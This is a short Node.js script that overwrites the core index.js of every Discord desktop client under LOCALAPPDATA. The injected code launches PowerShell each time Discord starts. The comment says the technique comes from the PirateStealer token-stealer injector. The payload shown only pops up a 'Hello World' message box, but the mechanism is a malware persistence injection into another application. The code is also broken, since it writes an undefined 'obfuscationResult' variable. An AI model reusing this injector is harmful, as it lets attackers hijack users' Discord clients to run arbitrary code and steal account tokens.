const fs = require("fs"),
    glob = require("glob");

var HelloWorld = [ "Discord", "DiscordPTB", "DiscordCanary", "DiscordDevelopment" ];

(async ()=>{
    var script = `(async ()=>{const { spawnSync } = require('child_process');spawnSync("powershell.exe", [\` Add-Type -AssemblyName PresentationCore,PresentationFramework; [System.Windows.MessageBox]::Show('Hello World !', 'github.com/HideakiAtsuyo'); \`]);})();\nmodule.exports = require('./core.asar');`;

    HelloWorld.forEach(function(folderName) { //https://github.com/Stanley-GF/PirateStealer/blob/main/src/injector/index-win.js#L38-L43
        glob.sync(`${process.env.LOCALAPPDATA}\\${folderName}\\app-*\\modules\\discord_desktop_core-*\\discord_desktop_core\\index.js`).map(file => {
            fs.writeFile(`${file}`, obfuscationResult, err => {
                if (err){
                    console.error(err);
                    return;
                }
            })
        })
    });
})();
